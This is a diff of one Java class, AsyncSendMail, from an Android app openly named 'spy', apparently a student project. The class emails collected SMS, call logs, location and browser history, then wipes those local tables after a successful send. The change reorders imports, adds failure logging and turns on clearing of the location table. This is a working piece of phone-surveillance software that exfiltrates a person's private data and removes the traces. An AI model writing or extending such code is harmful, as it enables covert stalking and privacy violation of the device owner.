@@ -1,11 +1,11 @@
 package edu.uj.jkordas.spy;
 
-import java.util.Calendar;
-import java.util.List;
-
 import android.content.Context;
 import android.os.AsyncTask;
 import android.util.Log;
+
+import java.util.Calendar;
+import java.util.List;
 
 import edu.uj.jkordas.spy.DAO.BrowserHistoryDataSource;
 import edu.uj.jkordas.spy.DAO.CallDataSource;
@@ -15,6 +15,7 @@ import edu.uj.jkordas.spy.POJO.Call;
 import edu.uj.jkordas.spy.POJO.Location;
 import edu.uj.jkordas.spy.POJO.Sms;
 import edu.uj.jkordas.spy.POJO.VisitedPage;
+import edu.uj.jkordas.spy.developer.Logger;
 
 
 public class AsyncSendMail extends AsyncTask<Void, Void, Void> {
@@ -69,12 +70,12 @@ public class AsyncSendMail extends AsyncTask<Void, Void, Void> {
 			// m.addAttachment(fileName);
 
 			if (m.send()) {
-				// log(, "Email was sent successfully.");
-				clearAllTables();
+//				log(, "Email was sent successfully.");
+                clearAllTables();
 
 			} else {
-				// Logger.log(getApplicationContext(), "Email was  not sent.");
-			}
+                Logger.log(this.context, "Email was  not sent.");
+            }
 		} catch (Exception e) {
 			Log.e("MailApp", "Could not send email", e);
 		}
@@ -96,8 +97,8 @@ public class AsyncSendMail extends AsyncTask<Void, Void, Void> {
 		/*** LOCATION ***/
 		LocationDataSource locationDatasource = new LocationDataSource(context);
 		locationDatasource.open();
-		//locationDatasource.clearTable();
-		locationDatasource.close();
+        locationDatasource.clearTable();
+        locationDatasource.close();
 		/*** BROWSER HISTORY ***/
 		BrowserHistoryDataSource browserDatasource = new BrowserHistoryDataSource(context);
 		browserDatasource.open();
